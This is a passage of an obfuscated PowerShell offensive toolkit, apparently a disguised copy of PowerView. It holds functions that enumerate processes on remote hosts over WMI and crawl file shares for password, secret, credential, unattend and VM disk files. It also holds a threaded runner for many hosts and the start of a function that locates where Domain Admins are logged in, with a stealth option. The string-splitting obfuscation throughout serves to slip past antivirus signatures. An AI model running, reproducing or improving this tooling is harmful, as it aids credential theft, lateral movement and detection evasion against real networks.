        ForEach (${com`P`Uter} in ${Co`M`PuTernaME}) {
            try {
                ${wm`ia`RguMEN`TS} = @{
                    ("{0}{2}{3}{1}"-f 'C','erName','ompu','t') = ${CO`m`PUteR`Name}
                    ("{1}{0}"-f 'ass','Cl') = ("{3}{2}{1}{0}" -f'cess','ro','p','Win32_')
                }
                if (${p`S`BO`UNdp`ArAmet`eRs}[("{2}{0}{3}{1}" -f'r','dential','C','e')]) { ${wMiar`g`U`MENTS}[("{0}{1}{2}" -f'Credent','ia','l')] = ${crE`DEN`TIal} }
                &("{3}{4}{1}{2}{0}" -f'ect','b','j','Get-W','MIo') @WmiArguments | &("{0}{2}{1}"-f'ForEach-','ect','Obj') {
                    ${O`wNer} = ${_}.("{1}{2}{0}"-f'er','geto','wn').Invoke();
                    ${pr`OCe`sS} = &("{1}{0}{3}{2}" -f 'Obj','New-','ct','e') ("{0}{1}{2}"-f'P','SObjec','t')
                    ${pr`o`cesS} | &("{1}{2}{0}"-f 'ember','Add','-M') ("{2}{1}{0}" -f'roperty','otep','N') ("{2}{1}{0}{3}" -f 'terNa','mpu','Co','me') ${cOMp`UT`er}
                    ${PRO`cEss} | &("{2}{1}{0}" -f'ber','Mem','Add-') ("{2}{1}{0}" -f'ty','proper','Note') ("{1}{2}{0}" -f'e','ProcessN','am') ${_}."Proc`e`SSnaME"
                    ${P`R`OCESs} | &("{2}{1}{0}{3}"-f 'Mem','dd-','A','ber') ("{0}{3}{2}{1}"-f 'Note','y','opert','pr') ("{1}{2}{0}"-f 'sID','Pro','ces') ${_}."PRo`C`ESsiD"
                    ${prO`Ce`ss} | &("{2}{1}{0}"-f 'ber','m','Add-Me') ("{3}{1}{0}{2}"-f'r','pe','ty','Notepro') ("{0}{1}"-f 'Do','main') ${o`Wner}."Do`MAIN"
                    ${p`Ro`CeSs} | &("{1}{2}{0}" -f'ber','Add-Me','m') ("{0}{1}{2}{3}" -f'Not','eprope','r','ty') ("{0}{1}" -f'U','ser') ${Ow`N`eR}."U`Ser"
                    ${pR`oceSs}."P`soB`jECT"."tY`pena`Mes".("{1}{0}" -f 'rt','Inse').Invoke(0, ("{4}{1}{2}{3}{0}" -f'erProcess','Vie','w.','Us','Power'))
                    ${pRoC`E`Ss}
                }
            }
            catch {
                &("{3}{0}{1}{2}" -f 'e-Ve','r','bose','Writ') ('[Get-WMI'+'P'+'roc'+'ess'+'] '+'Erro'+'r '+'enum'+'e'+'rating '+'re'+'m'+'ote '+'process'+'es'+' '+'on'+' '+"'$Computer', "+'acce'+'ss '+'likel'+'y '+'d'+'eni'+'ed: '+"$_")
            }
        }
    }
}


function Find-inT`eResTiN`g`F`iLe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}"-f'Should','Proc','ess','PS'}, '')]
    [OutputType({"{1}{2}{4}{3}{0}"-f'File','Po','w','nd','erView.Fou'})]
    [CmdletBinding(deFAuLTpARAMeTeRseTnAMe = {"{3}{0}{2}{4}{5}{1}" -f'eS','n','pecifica','Fil','ti','o'})]
    Param(
        [Parameter(poSITiON = 0, VALUEFrompipELInE = ${t`RuE}, valuefROMpIpeLiNEbYPROPeRTynAmE = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pa`TH} = '.\',

        [Parameter(pARAmeTERseTNamE = "fileSpe`c`i`FiCaT`IoN")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'erms','chT','Sear'}, {"{1}{0}" -f'ms','Ter'})]
        [String[]]
        ${in`c`LUde} = @(("{2}{0}{3}{1}" -f'pas','rd*','*','swo'), ("{3}{1}{2}{0}"-f'ive*','se','nsit','*'), ("{1}{2}{0}" -f'in*','*ad','m'), ("{0}{2}{1}"-f '*','*','login'), ("{1}{2}{0}" -f'ret*','*s','ec'), ("{1}{0}{3}{2}"-f 'atten','un','l','d*.xm'), ("{0}{1}"-f'*.vmd','k'), ("{2}{0}{1}" -f 'cred','s*','*'), ("{3}{1}{0}{2}" -f'tial','eden','*','*cr'), ("{1}{0}{2}"-f'.con','*','fig')),

        [Parameter(PaRAmeteRsETName = "FIlespecifiC`A`Ti`oN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LaST`AC`CEsstime},

        [Parameter(ParaMEtersETnAMe = "fI`leSpe`c`If`iCAT`iON")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${laS`T`wrIt`EtIme},

        [Parameter(pARAMetERsEtNAmE = "FIL`ES`P`eCIfIc`AtIon")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${C`REAtio`N`Time},

        [Parameter(paramEteRsETNAmE = "O`FFICeDO`CS")]
        [Switch]
        ${Of`FI`CEdOcs},

        [Parameter(parametERsETNaMe = "f`R`eSHExes")]
        [Switch]
        ${fRe`s`hex`ES},

        [Parameter(parAmeTErseTNamE = "F`I`LeSPECi`F`iCa`TIoN")]
        [Switch]
        ${EXclUd`e`FOlDe`RS},

        [Parameter(PArAmeTerseTNaME = "fI`l`E`SPecIFIcaTi`oN")]
        [Switch]
        ${exClUd`E`H`iDdEN},

        [Switch]
        ${Ch`eC`K`wRiTeaC`CEsS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDenTI`Al} =   (get-VaRiABLe  ("0D"+"sqR") ).VALUE::"Em`PTY"
    )

    BEGIN {
        ${sEa`RcHeRA`R`gU`m`eNTS} =  @{
            ("{0}{1}"-f'Re','curse') = ${T`RuE}
            ("{1}{0}{3}{2}"-f 'rr','E','tion','orAc') = ("{0}{2}{4}{1}{3}"-f'Sil','u','ently','e','Contin')
            ("{1}{0}{2}"-f 'nc','I','lude') = ${i`NCl`UDE}
        }
        if (${P`SbOUNDPAR`AmE`TERs}[("{1}{0}{2}" -f 'fficeD','O','ocs')]) {
            ${s`e`Arc`hEraRg`UmEN`Ts}[("{1}{0}" -f'clude','In')] = @(("{1}{0}"-f 'doc','*.'), ("{1}{0}"-f 'cx','*.do'), ("{1}{0}"-f 's','*.xl'), ("{0}{2}{1}" -f'*.x','sx','l'), ("{1}{0}" -f 'pt','*.p'), ("{1}{0}"-f 'pptx','*.'))
        }
        elseif (${PSb`OUNd`pA`RAMetE`Rs}[("{1}{2}{0}"-f'XEs','Fresh','E')]) {
            
            ${Las`T`Ac`CESStime} = (&("{2}{0}{1}" -f 'et-Da','te','G')).("{0}{1}" -f'AddDay','s').Invoke(-7).("{1}{0}" -f'oString','T').Invoke(("{1}{0}{3}{2}"-f '/dd/y','MM','yy','y'))
            ${SeAR`cHe`Rar`guMen`Ts}[("{0}{1}"-f 'I','nclude')] = @(("{0}{1}"-f '*.e','xe'))
        }
        ${SEa`RCh`erARG`U`MeN`Ts}[("{0}{1}"-f'Fo','rce')] = -not ${p`SBoUn`D`PaRAmE`TErs}[("{1}{3}{0}{2}" -f'de','ExcludeH','n','id')]

        ${mAppEDCO`MPu`T`ERS} = @{}

        function TES`T-`wrIte {
            
            [CmdletBinding()]Param([String]${pa`Th})
            try {
                ${f`iLEt`eSt} =   (VaRiABLE  W7T -VaLueoN  )::("{1}{0}" -f 'e','OpenWrit').Invoke(${p`AtH})
                ${fI`LEtesT}.("{0}{1}"-f'Cl','ose').Invoke()
                ${tR`UE}
            }
            catch {
                ${F`ALSE}
            }
        }
    }

    PROCESS {
        ForEach (${t`A`RGetPa`TH} in ${P`ATH}) {
            if ((${TaRge`Tp`ATH} -Match ((("{2}{3}{0}{1}" -f'0}.*{0}{0}.','*','{','0}{0}{0}{'))-F [CHaR]92)) -and (${PsBoU`ND`parAMet`ErS}[("{2}{1}{0}"-f'l','dentia','Cre')])) {
                ${ho`sTcOMPut`er} = (&("{3}{0}{1}{2}"-f'Obje','c','t','New-') ("{3}{0}{1}{2}" -f'yst','em','.Uri','S')(${Ta`RG`EtpATh}))."H`oSt"
                if (-not ${M`App`E`dCo`MPUte`Rs}[${hOS`T`cOM`puteR}]) {
                    
                    &("{3}{0}{2}{1}"-f'-RemoteCo','ction','nne','Add') -ComputerName ${h`OST`c`o`MputEr} -Credential ${CreD`E`NTial}
                    ${mA`Ppe`Dc`OM`PuterS}[${hos`Tc`OMpUtER}] = ${T`Rue}
                }
            }

            ${s`E`ARC`HeRargumENts}[("{1}{0}" -f 'ath','P')] = ${Ta`RGEtp`Ath}
            &("{2}{0}{1}" -f't','em','Get-ChildI') @SearcherArguments | &("{1}{3}{0}{2}" -f'j','F','ect','orEach-Ob') {
                
                ${Co`NT`iNue} = ${T`RUe}
                if (${PS`BouNDPar`AMeT`Ers}[("{0}{2}{1}" -f'Ex','udeFolders','cl')] -and (${_}."P`siS`cO`NTAInER")) {
                    &("{3}{2}{1}{0}" -f'ose','e-Verb','rit','W') "Excluding: $($_.FullName) "
                    ${c`On`Tinue} = ${f`AL`Se}
                }
                if (${lAstA`Cc`eSstImE} -and (${_}."LAsT`ACCe`sSti`ME" -lt ${LAS`TA`CcESST`ImE})) {
                    ${CONTi`Nue} = ${f`AlSE}
                }
                if (${P`sboUNdPAr`AmeT`E`RS}[("{0}{3}{2}{1}" -f 'Las','eTime','rit','tW')] -and (${_}."LA`STW`RITeTIme" -lt ${Las`TW`RitE`TI`ME})) {
                    ${C`On`T`Inue} = ${fa`lSe}
                }
                if (${PsBo`UnDP`Ar`Am`etErs}[("{0}{2}{3}{1}" -f 'Creat','e','ion','Tim')] -and (${_}."CrEATioN`T`IME" -lt ${c`REAT`ioNti`me})) {
                    ${COn`Ti`NuE} = ${F`AL`SE}
                }
                if (${pSbo`U`NDparaMe`T`Ers}[("{0}{2}{1}{3}{4}" -f 'Chec','te','kWri','Acces','s')] -and (-not (&("{0}{2}{1}" -f'T','-Write','est') -Path ${_}."FUL`lnAme"))) {
                    ${c`On`TInUE} = ${f`A`LSe}
                }
                if (${c`OnTi`NuE}) {
                    ${FI`L`Ep`ARAMs} = @{
                        ("{0}{1}"-f 'Pa','th') = ${_}."FuL`lN`Ame"
                        ("{0}{1}"-f 'Own','er') = $((&("{0}{1}" -f 'Get-A','cl') ${_}."f`U`LlNAmE")."O`WNer")
                        ("{0}{1}{2}"-f 'La','stAccessT','ime') = ${_}."L`AStaCc`eSStimE"
                        ("{3}{0}{2}{1}" -f 'Wr','eTime','it','Last') = ${_}."lAs`T`W`RIteTime"
                        ("{0}{1}{3}{2}" -f 'Cre','at','onTime','i') = ${_}."crEaT`iO`NTIME"
                        ("{1}{0}" -f 'th','Leng') = ${_}."l`EngTH"
                    }
                    ${F`OUNdfI`lE} = &("{1}{0}{3}{2}" -f 'w-O','Ne','t','bjec') -TypeName ("{0}{1}{2}" -f'PS','Obje','ct') -Property ${f`ILe`PARAms}
                    ${FO`UNdF`ILe}."pSOB`j`Ect"."TY`peN`AMEs".("{1}{0}"-f'nsert','I').Invoke(0, ("{3}{2}{1}{0}" -f 'ndFile','ew.Fou','erVi','Pow'))
                    ${fO`U`NdFile}
                }
            }
        }
    }

    END {
        
        ${MA`P`peD`CO`MPuTers}."ke`YS" | &("{3}{1}{0}{4}{2}{5}"-f 'oteC','-Rem','cti','Remove','onne','on')
    }
}








function n`ew`-tH`READEdFuN`cT`iON {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{10}{6}{1}{3}{5}{8}{9}{7}{2}{0}{4}"-f'io','oc','gFunct','e','ns','ss','houldPr','ateChangin','Fo','rSt','PSUseS'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSitIoN = 0, mANdATory = ${t`RuE}, VALuefROMpIpEline = ${T`RUE}, vAlUefrompipELINEbYPRopERTYnaME = ${T`RUe})]
        [String[]]
        ${Co`mPuTeRN`Ame},

        [Parameter(poSiTIon = 1, maNDATORy = ${TR`UE})]
        [System.Management.Automation.ScriptBlock]
        ${sCR`iPt`Bl`OcK},

        [Parameter(POSItiOn = 2)]
        [Hashtable]
        ${SCRI`PtpAR`AM`E`TeRs},

        [Int]
        [ValidateRange(1,  100)]
        ${t`HREadS} = 20,

        [Switch]
        ${n`oI`mPORtS}
    )

    BEGIN {
        
        
        ${Ses`si`o`NsTAtE} =   (ls ('Va'+'riAB'+'le:O'+'w6')  ).valUe::("{0}{1}{2}"-f'Cr','eateDefau','lt').Invoke()

        
        
        ${s`E`s`sIO`NSTATe}."a`pArT`MENTsta`TE" =  ( gi VarIablE:2PNA).VAlUe::"s`Ta"

        
        
        if (-not ${n`O`IMp`OrtS}) {
            
            ${m`YV`ARS} = &("{1}{3}{2}{0}" -f 'ble','Get','ia','-Var') -Scope 2

            
            ${vORBi`D`dEN`VarS} = @('?',("{1}{0}"-f'rgs','a'),("{3}{2}{0}{1}"-f'ileNa','me','oleF','Cons'),("{0}{1}"-f 'E','rror'),("{3}{2}{1}{4}{0}" -f 't','Conte','on','Executi','x'),("{0}{1}"-f 'fa','lse'),("{1}{0}" -f 'ME','HO'),("{1}{0}" -f 't','Hos'),("{0}{1}"-f'inp','ut'),("{1}{0}{2}{3}" -f 't','Inpu','Objec','t'),("{3}{0}{4}{2}{1}"-f'axim','unt','sCo','M','umAlia'),("{1}{5}{3}{2}{4}{0}" -f 't','Ma','umDr','m','iveCoun','xi'),("{0}{2}{1}{3}" -f'MaximumE','r','r','orCount'),("{0}{3}{4}{1}{2}" -f 'Max','ou','nt','imumFunc','tionC'),("{3}{0}{5}{1}{2}{4}"-f'imumH','stor','yCo','Max','unt','i'),("{2}{4}{1}{5}{0}{3}{6}" -f'i','imum','Ma','able','x','Var','Count'),("{0}{1}{2}{3}"-f 'MyI','n','vocati','on'),("{1}{0}" -f 'ull','n'),'PID',("{1}{2}{3}{0}" -f 's','PSBoundP','aramete','r'),("{4}{2}{1}{3}{0}"-f 'ndPath','om','SC','ma','P'),("{2}{3}{1}{0}"-f'lture','Cu','P','S'),("{0}{3}{2}{5}{4}{6}{7}{1}" -f 'PS','es','ault','Def','rV','Paramete','al','u'),("{1}{0}"-f'SHOME','P'),("{3}{0}{1}{2}"-f'criptR','o','ot','PSS'),("{0}{2}{1}" -f'PSUIC','ure','ult'),("{2}{4}{0}{3}{1}"-f 'ionT','e','P','abl','SVers'),'PWD',("{0}{1}{2}" -f 'Sh','el','lId'),("{1}{3}{2}{0}"-f 'h','Synchro','zedHas','ni'),("{0}{1}"-f'tr','ue'))

            
            ForEach (${v`AR} in ${mY`VA`RS}) {
                if (${vOrbi`D`DE`NvARS} -NotContains ${V`Ar}."n`AmE") {
                ${SEs`SI`oNSTATE}."varIa`B`leS".("{0}{1}"-f 'A','dd').Invoke((&("{1}{2}{0}"-f't','Ne','w-Objec') -TypeName ("{3}{8}{13}{11}{1}{2}{5}{7}{10}{0}{12}{6}{4}{9}" -f 'aces.Se','Au','t','Sy','eVariableEntr','oma','nStat','ti','s','y','on.Runsp','ment.','ssio','tem.Manage') -ArgumentList ${v`AR}."NA`ME",${v`AR}."V`ALue",${V`AR}."d`ES`CRi`PTIon",${V`Ar}."OPt`i`oNS",${V`AR}."A`TTRI`BuTeS"))
                }
            }

            
            ForEach (${FuNc`TI`on} in (&("{1}{0}{2}{3}" -f 'ld','Get-Chi','I','tem') ("{2}{1}{0}"-f'ion:','t','Func'))) {
                ${se`s`SI`ONStaTE}."co`mM`AnDs".("{0}{1}" -f'Ad','d').Invoke((&("{1}{2}{0}"-f 't','Ne','w-Objec') -TypeName ("{3}{8}{0}{6}{10}{2}{9}{7}{1}{5}{4}" -f 'ent.Automation.','o','.SessionSt','System.Manage','ntry','nE','Runspa','uncti','m','ateF','ces') -ArgumentList ${f`U`NctIon}."n`AMe", ${fU`NC`TIoN}."Def`InI`TiON"))
            }
        }

        
        
        

        
        ${p`Ool} =  (get-vAriable ("X"+"2A") -vA )::("{2}{0}{1}{3}"-f 'eateRu','nspac','Cr','ePool').Invoke(1, ${THre`A`dS}, ${SesS`IO`NSTaTe}, ${H`osT})
        ${Po`oL}.("{1}{0}" -f'n','Ope').Invoke()

        
        ${m`eThod} = ${NU`LL}
        ForEach (${M} in   (iTem VArIablE:orbVw4  ).vAluE.("{2}{0}{1}"-f 'etMeth','ods','G').Invoke() | &("{1}{0}{2}" -f 'here-Obj','W','ect') { ${_}."NA`mE" -eq ("{2}{3}{1}{0}"-f'e','k','BeginIn','vo') }) {
            ${M`e`ThODpaRA`m`ETERS} = ${m}.("{1}{0}{2}"-f 'rameter','GetPa','s').Invoke()
            if ((${mE`T`hoDp`ArAmeTErS}."Cou`Nt" -eq 2) -and ${mETHodPa`R`A`ME`TErS}[0]."n`Ame" -eq ("{0}{1}"-f'in','put') -and ${ME`ThOdp`A`RA`m`eteRS}[1]."Na`me" -eq ("{1}{0}"-f 'ut','outp')) {
                ${M`e`ThOd} = ${m}."mA`kegen`Er`ic`mETHOD"([Object], [Object])
                break
            }
        }

        ${jO`BS} = @()
        ${Compu`TE`Rn`AME} = ${cOmpu`T`E`RnAMe} | &("{1}{3}{0}{2}"-f 'bje','Where','ct','-O') {${_} -and ${_}.("{1}{0}"-f 'm','Tri').Invoke()}
        &("{1}{2}{3}{0}"-f'se','Wri','te','-Verbo') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${T`Hrea`ds} -ge ${comp`U`TErNA`mE}."l`enGTH") {
            ${th`R`EaDS} = ${C`OmP`U`TerNAME}."LEnG`TH"
        }
        ${eL`EmenTsPlI`TSi`ze} = [Int](${co`MP`UTeRNAmE}."l`eNgTh"/${TH`R`eAds})
        ${coM`Pu`Tern`AME`pArti`T`iO`NEd} = @()
        ${StA`RT} = 0
        ${E`Nd} = ${E`lem`E`NtsPl`I`TSIZE}

        for(${i} = 1; ${i} -le ${T`HR`EAds}; ${i}++) {
            ${L`ISt} = &("{1}{0}{2}" -f'ew-O','N','bject') ("{7}{2}{3}{0}{4}{5}{1}{6}"-f 'ect','i','stem.Co','ll','ion','s.ArrayL','st','Sy')
            if (${I} -eq ${TH`R`Eads}) {
                ${E`ND} = ${comPu`TEr`Na`Me}."l`ENgtH"
            }
            ${lI`st}."adDR`ANGe"(${CoM`Pu`TERn`Ame}[${s`TarT}..(${E`ND}-1)])
            ${s`TaRt} += ${ELe`M`E`NTSP`lITsIzE}
            ${e`Nd} += ${elE`M`eNTsP`LITs`iZe}
            ${COmpu`T`eR`N`AMep`Ar`Titi`OneD} += @(,@(${l`ist}.("{1}{2}{0}" -f'ray','T','oAr').Invoke()))
        }

        &("{0}{3}{1}{2}"-f 'Write','er','bose','-V') ('['+'New-T'+'h'+'r'+'ead'+'ed'+'F'+'unction] '+'To'+'ta'+'l '+'num'+'ber'+' '+'o'+'f '+'th'+'reads/'+'par'+'titi'+'o'+'ns: '+"$Threads")

        ForEach (${comPu`T`eR`Nam`EPaRt`iT`iOn} in ${CO`MPUTE`R`NamePaRtITIo`NeD}) {
            
            ${POwER`SH`ELl} =   (ChIldItEm  VArIABLe:ORBVW4).vALUE::("{0}{1}" -f'Cr','eate').Invoke()
            ${pO`w`ErSHElL}."Ru`N`SPACE`poOL" = ${po`oL}

            
            ${N`Ull} = ${PO`WEr`SHELl}.("{1}{0}{2}" -f'i','AddScr','pt').Invoke(${SCRIPT`B`lOcK}).("{3}{2}{0}{1}"-f 'ra','meter','dPa','Ad').Invoke(("{1}{0}{3}{2}" -f 'p','Com','me','uterNa'), ${cOMP`UTeRN`A`me`p`ART`ItIon})
            if (${sC`RiptPar`AM`eTErS}) {
                ForEach (${pa`R`AM} in ${s`cR`IPTp`ARAme`TerS}.("{1}{3}{4}{0}{2}"-f 'erato','Ge','r','tEn','um').Invoke()) {
                    ${nU`LL} = ${p`o`w`eRshell}.("{1}{0}{2}"-f 'ra','AddPa','meter').Invoke(${pA`R`Am}."na`Me", ${p`Aram}."V`AlUE")
                }
            }

            
            ${Outp`Ut} = &("{2}{0}{1}{3}" -f 'ew-','Ob','N','ject') ("{2}{1}{4}{6}{3}{5}{0}{7}" -f'Object','t.Auto','Managemen','n.PSDataCo','ma','llection[','tio',']')

            
            ${jO`Bs} += @{
                ('PS') = ${PO`wers`helL}
                ("{0}{1}"-f 'Ou','tput') = ${oU`T`pUT}
                ("{2}{1}{0}" -f't','ul','Res') = ${me`THoD}."iN`V`OkE"(${PowE`RSh`E`ll}, @(${N`UlL}, [Management.Automation.PSDataCollection[Object]]${o`UtP`Ut}))
            }
        }
    }

    END {
        &("{2}{1}{0}" -f 'e','e-Verbos','Writ') ("{5}{0}{4}{7}{6}{8}{2}{1}{3}" -f 'Th','ecutin','reads ex','g','re','[New-','tion]','adedFunc',' Th')

        
        Do {
            ForEach (${J`OB} in ${j`obS}) {
                ${J`Ob}."outP`Ut".("{0}{1}" -f'Rea','dAll').Invoke()
            }
            &("{0}{3}{2}{1}" -f'Start-S','p','e','le') -Seconds 1
        }
        While ((${J`oBS} | &("{0}{2}{1}"-f'Whe','-Object','re') { -not ${_}."Re`sult"."iScOMP`L`ETed" })."c`OunT" -gt 0)

        ${Sl`E`Ep`SEcOn`Ds} = 100
        &("{0}{3}{1}{2}{4}" -f 'Write','b','os','-Ver','e') ('['+'New-'+'Th'+'r'+'eadedFunctio'+'n] '+'Waitin'+'g '+"$SleepSeconds "+'sec'+'onds '+'for'+' '+'fi'+'nal'+' '+'clean'+'up'+'...')

        
        for (${i}=0; ${i} -lt ${sl`ee`pSecondS}; ${I}++) {
            ForEach (${j`OB} in ${jO`BS}) {
                ${J`oB}."Out`PUT".("{0}{1}{2}"-f'R','e','adAll').Invoke()
                ${j`Ob}."p`s".("{1}{0}{2}" -f 'os','Disp','e').Invoke()
            }
            &("{2}{0}{1}" -f 't-','Sleep','Star') -S 1
        }

        ${Po`OL}.("{1}{0}" -f'ose','Disp').Invoke()
        &("{3}{0}{2}{1}" -f 'te','erbose','-V','Wri') ("{5}{6}{11}{8}{12}{2}{0}{10}{1}{7}{9}{4}{3}" -f'ea',' ','] all thr','ed','mplet','[N','ew-Th','c','dedFunctio','o','ds','rea','n')
    }
}


function f`IND`-do`M`A`Inus`E`RLoCation {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}"-f 'ess','ShouldPro','PS','c'}, '')]
    [OutputType({"{2}{6}{4}{3}{1}{0}{5}" -f 'L','rView.User','P','e','w','ocation','o'})]
    [CmdletBinding(DeFaULtpArameteRsetName = {"{0}{1}{3}{2}"-f 'Use','rGrou','y','pIdentit'})]
    Param(
        [Parameter(pOsITion = 0, VALuEFROMpIpElIne = ${t`RuE}, VALueFROMpIpELiNebyPropErTyname = ${T`Rue})]
        [Alias({"{0}{3}{2}{1}" -f 'DNS','Name','ost','H'})]
        [String[]]
        ${C`ompu`TE`RNA`mE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`iN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoMp`UTeR`d`OmAin},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOm`pU`TErlDa`P`FIlT`er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${com`P`UteRSea`R`cHBASe},

        [Alias({"{2}{3}{0}{1}"-f'ai','ned','Uncon','str'})]
        [Switch]
        ${c`om`PUt`E`RUncONStR`AInEd},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{3}{1}{2}"-f'Oper','ngS','ystem','i','at'})]
        [String]
        ${C`omPuT`er`oP`eR`A`TInGSyStEM},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'ck','a','Service','P'})]
        [String]
        ${c`ompUtEr`sErVi`CeP`ACk},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'Na','Site','me'})]
        [String]
        ${Co`MpuTer`S`it`enAmE},

        [Parameter(PAraMETErseTNAMe = "u`se`Ri`DentITy")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${u`sErID`En`T`ItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USe`R`d`OmaIn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${UseRL`d`APFILt`Er},

        [ValidateNotNullOrEmpty()]
        [String]
        ${uSeRs`eARcHB`ASE},

        [Parameter(pARAMetErSetNAME = "us`E`RGROu`Pid`ENTI`TY")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'GroupNa','m','e'}, {"{1}{0}"-f 'oup','Gr'})]
        [String[]]
        ${us`erG`RoUPiD`eN`TiTy} = ("{0}{2}{1}" -f'D','main Admins','o'),

        [Alias({"{2}{1}{0}" -f't','minCoun','Ad'})]
        [Switch]
        ${uS`e`R`ADMINcoUNt},

        [Alias({"{1}{2}{3}{0}" -f'n','Allow','Delega','tio'})]
        [Switch]
        ${us`Er`AllO`wdeLEgatI`On},

        [Switch]
        ${cHecka`cce`Ss},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}"-f'oller','Do','mainCon','tr'})]
        [String]
        ${SE`R`VEr},

        [ValidateSet({"{0}{1}" -f'Bas','e'}, {"{2}{1}{0}" -f 'el','neLev','O'}, {"{1}{0}{2}"-f're','Subt','e'})]
        [String]
        ${S`E`Ar`chScOPE} = ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`es`UlTp`A`GESIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRVErt`ime`lImiT},

        [Switch]
        ${t`omB`St`One},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDe`Nti`AL} =   (dir ("VAR"+"IABL"+"E:"+"0DSqr")).VALUe::"E`MPtY",

        [Switch]
        ${S`Topon`sU`cCEss},

        [ValidateRange(1, 10000)]
        [Int]
        ${dE`lay} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${J`iTTER} = .3,

        [Parameter(PaRAmETeRseTnAmE = "shO`w`AlL")]
        [Switch]
        ${s`hoWALL},

        [Switch]
        ${st`ea`lth},

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}" -f 'F','ile'}, 'All')]
        ${StEal`TH`sOuRCe} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${THrE`ADS} = 20
    )

    BEGIN {

        ${coM`Put`eRSeaRCHer`A`R`GuMEn`TS} = @{
            ("{0}{1}{3}{2}" -f'P','roperti','s','e') = ("{3}{1}{0}{2}"-f 'ost','nsh','name','d')
        }
        if (${p`sB`o`UNDpArAMetErs}[("{0}{1}"-f 'Dom','ain')]) { ${ComPu`TeRse`ARCh`eRArGUMeN`TS}[("{1}{0}{2}"-f'omai','D','n')] = ${dO`mAIn} }
        if (${PS`BOU`NdPar`AM`ETers}[("{2}{1}{3}{0}{4}" -f'r','ut','Comp','e','Domain')]) { ${CoMPute`R`S`eArch`Er`A`Rg`U`MentS}[("{1}{0}" -f 'main','Do')] = ${COMpUTerD`o`m`Ain} }
        if (${psB`Ou`NDPA`RaM`ET`ers}[("{0}{1}{4}{3}{2}{5}"-f 'Compu','t','ilte','LDAPF','er','r')]) { ${compu`Te`RsEaRCh`e`RaRgUm`E`N`Ts}[("{3}{0}{2}{1}"-f 'Fi','er','lt','LDAP')] = ${c`OMPuteR`LDap`Fil`T`ER} }
        if (${pS`Bo`UNdpar`Amet`ERS}[("{1}{3}{2}{0}" -f'rchBase','ComputerS','a','e')]) { ${Compu`TErs`e`ArcHERaRG`U`me`NTs}[("{0}{2}{1}" -f'Searc','e','hBas')] = ${C`oMpUTERseArC`Hb`Ase} }
        if (${P`s`BOu`NdPaRA`METE`Rs}[("{1}{0}{3}{2}" -f'n','U','nstrained','co')]) { ${COM`PuTe`RsearCHEra`RGUM`E`Nts}[("{3}{2}{1}{0}" -f'ined','a','nconstr','U')] = ${u`NCOn`S`TRaINED} }
        if (${ps`B`OUNd`pa`RAMEt`ERS}[("{5}{3}{0}{1}{4}{2}" -f 'uterO','perat','ngSystem','p','i','Com')]) { ${coMPUTe`RsEArCherA`R`G`Ume`Nts}[("{1}{4}{3}{0}{2}" -f 'ngSyste','Op','m','rati','e')] = ${OP`E`R`AtiNgs`YsTeM} }
        if (${PS`B`OuNdP`ArAME`TERS}[("{0}{1}{3}{2}{6}{5}{4}" -f 'Comput','e','e','rS','ck','ePa','rvic')]) { ${cO`m`P`UtER`SEa`RCHErA`RgUmENTS}[("{2}{1}{0}" -f 'k','ervicePac','S')] = ${Serv`IC`EpaCK} }
        if (${P`sBouND`pa`RAME`T`ERs}[("{1}{3}{0}{4}{2}"-f'ite','C','e','omputerS','Nam')]) { ${COMpuT`E`RSea`RC`heRaRGUMEnTs}[("{0}{1}{2}"-f'Si','t','eName')] = ${SIt`ENA`mE} }
        if (${p`SBOund`P`A`RAM`ETErs}[("{0}{1}"-f 'Serv','er')]) { ${Co`mp`U`TEr`Se`ArchErargUmE`NTS}[("{2}{0}{1}" -f'er','ver','S')] = ${sE`R`VER} }
        if (${pSBo`U`N`dp`AraM`eteRS}[("{2}{1}{0}"-f 'pe','co','SearchS')]) { ${Com`PUT`ERS`e`ARchErA`RG`Um`entS}[("{1}{0}{2}"-f'rchSco','Sea','pe')] = ${SEarCHSC`O`Pe} }
        if (${P`S`B`oUNdpaRa`METE`RS}[("{0}{3}{2}{1}"-f'Res','e','PageSiz','ult')]) { ${cOm`p`U`TErS`E`ARch`e`RaRGUMEntS}[("{1}{0}{2}{4}{3}" -f 'esul','R','t','geSize','Pa')] = ${re`sulTpA`Ge`s`iZe} }
        if (${PsbO`UN`dp`AraMeTErs}[("{3}{2}{1}{0}" -f 'imeLimit','T','ver','Ser')]) { ${CoMP`UTersEa`R`CHerarG`UmE`NTs}[("{2}{3}{1}{0}" -f 'imit','eL','Serv','erTim')] = ${sErverTi`m`eL`I`M`IT} }
